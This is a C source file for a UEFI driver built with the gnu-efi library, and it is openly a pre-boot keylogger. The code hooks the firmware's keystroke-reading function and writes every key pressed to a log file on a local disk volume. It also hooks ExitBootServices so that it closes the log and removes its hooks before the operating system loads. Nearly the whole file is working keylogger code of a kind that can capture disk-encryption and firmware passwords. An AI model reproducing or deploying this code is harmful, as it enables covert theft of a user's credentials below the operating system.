#include <efi.h>
#include <efilib.h>
#include "keylogger.h"

EFI_EXIT_BOOT_SERVICES org_ExitBootServices	= 0;
EFI_INPUT_READ_KEY org_ReadKeyStroke =	0;

static const EFI_GUID GnuEfiAppsKeyloggerProtocolGuid
    = GNU_EFI_APPS_KEYLOGGER_PROTOCOL_GUID;

static struct {
    GNU_EFI_APPS_KEYLOGGER_PROTOCOL Proto;
    EFI_FILE_PROTOCOL *logfile;
} InternalGnuEfiAppsKeyloggerProtocolData;

static EFI_INPUT_READ_KEY hooked_ReadKeyStroke (IN struct _SIMPLE_INPUT_INTERFACE *This, OUT EFI_INPUT_KEY *Key)
{
    UINTN size = 2;
    Print(L"Key hooked: %x\n", Key->UnicodeChar);
    InternalGnuEfiAppsKeyloggerProtocolData.Proto.SaveKey(Key->UnicodeChar);
    return org_ReadKeyStroke(This, Key);
}

static EFI_STATUS	hooked_ExitBootServices (
    IN EFI_HANDLE ImageHandle,
    IN UINTN      MapKey
)
{
    Print(L"Exit hooked\n");
    // Closing log
    InternalGnuEfiAppsKeyloggerProtocolData.Proto.CloseLog();
    // Removing hooks
    ST->ConIn->ReadKeyStroke = org_ReadKeyStroke;
    gBS->ExitBootServices =	org_ExitBootServices;
    return org_ExitBootServices(ImageHandle, MapKey);
}

static
EFI_STATUS
EFI_FUNCTION
KeyloggerSaveKey(IN const CHAR16 Key)
{
    UINTN size = 2;
	InternalGnuEfiAppsKeyloggerProtocolData.logfile->Write(InternalGnuEfiAppsKeyloggerProtocolData.logfile, &size, &Key);
	InternalGnuEfiAppsKeyloggerProtocolData.logfile->Flush(InternalGnuEfiAppsKeyloggerProtocolData.logfile);
    return EFI_SUCCESS;
}


static
EFI_STATUS
EFI_FUNCTION
KeyloggerCloseLog()
{
    InternalGnuEfiAppsKeyloggerProtocolData.logfile->Close(InternalGnuEfiAppsKeyloggerProtocolData.logfile);
    Print(L"Log Closed\n");
    return EFI_SUCCESS;
}

static
EFI_STATUS
EFI_FUNCTION
KeyloggerUnload(IN EFI_HANDLE ImageHandle)
{
    LibUninstallProtocolInterfaces(ImageHandle,
                                   &GnuEfiAppsKeyloggerProtocolGuid,
                                   &InternalGnuEfiAppsKeyloggerProtocolData.Proto,
                                   NULL);
    return EFI_SUCCESS;
}


EFI_STATUS
efi_main (EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SysTab)
{
    EFI_STATUS Status;
    EFI_LOADED_IMAGE *LoadedImage = NULL;
    InitializeLib(ImageHandle, SysTab);

    // hooks
	org_ReadKeyStroke		= ST->ConIn->ReadKeyStroke;
    org_ExitBootServices		=	gBS->ExitBootServices;
    gBS->ExitBootServices		=	hooked_ExitBootServices;
	ST->ConIn->ReadKeyStroke =	hooked_ReadKeyStroke;

    /* Initialize global protocol definition + data */
    InternalGnuEfiAppsKeyloggerProtocolData.Proto.SaveKey
        = (GNU_EFI_APPS_KEYLOGGER_SAVE_KEY) KeyloggerSaveKey;
    InternalGnuEfiAppsKeyloggerProtocolData.Proto.CloseLog
        = (GNU_EFI_APPS_KEYLOGGER_CLOSE_LOG) KeyloggerCloseLog;

    /* Grab handle to this image: we'll attach our proto instance to it */
    Status = uefi_call_wrapper(BS->OpenProtocol, 6,
                               ImageHandle, &LoadedImageProtocol,
                               (void**)&LoadedImage, ImageHandle,
                               NULL, EFI_OPEN_PROTOCOL_GET_PROTOCOL);

    if (EFI_ERROR(Status)) {
        Print(L"Could not open loaded image protocol: %d\n", Status);
        return Status;
    }

    /* Attach our proto to the current driver image */
    Status = LibInstallProtocolInterfaces(
                 &ImageHandle, &GnuEfiAppsKeyloggerProtocolGuid,
                 &InternalGnuEfiAppsKeyloggerProtocolData.Proto, NULL);
    if (EFI_ERROR(Status)) {
        Print(L"Error registering driver instance: %d\n", Status);
        return Status;
    }
    LoadedImage->Unload = (EFI_IMAGE_UNLOAD)KeyloggerUnload;

    EFI_STATUS efi_status;
    EFI_SIMPLE_FILE_SYSTEM_PROTOCOL* fs = NULL;
    UINTN index;
    EFI_GUID sfspGuid = EFI_SIMPLE_FILE_SYSTEM_PROTOCOL_GUID;
    EFI_HANDLE* handles = NULL;
    UINTN handleCount = 0;
    efi_status = BS->LocateHandleBuffer(ByProtocol,
                                        &sfspGuid,
                                        NULL,
                                        &handleCount,
                                        &handles);
    // Getting root drive
    EFI_FILE_PROTOCOL* root = NULL;
    for (index = 0; index < (int)handleCount; ++ index)
    {
        efi_status = BS->HandleProtocol(
                         handles[index],
                         &sfspGuid,
                         (void**)&fs);
    }
    efi_status = fs->OpenVolume(fs, &root);
    // FIXME opens at start of file
    efi_status = root->Open(root, &(InternalGnuEfiAppsKeyloggerProtocolData.logfile), (CHAR16*)LOGFILE, EFI_FILE_MODE_CREATE | EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE, 0);
    if (EFI_ERROR(efi_status)) {
        Print(L"\nFile Open did not work %s\n", LOGFILE);
    }
    Print(L"Driver instance loaded successfully.\n");
    return EFI_SUCCESS;  
}
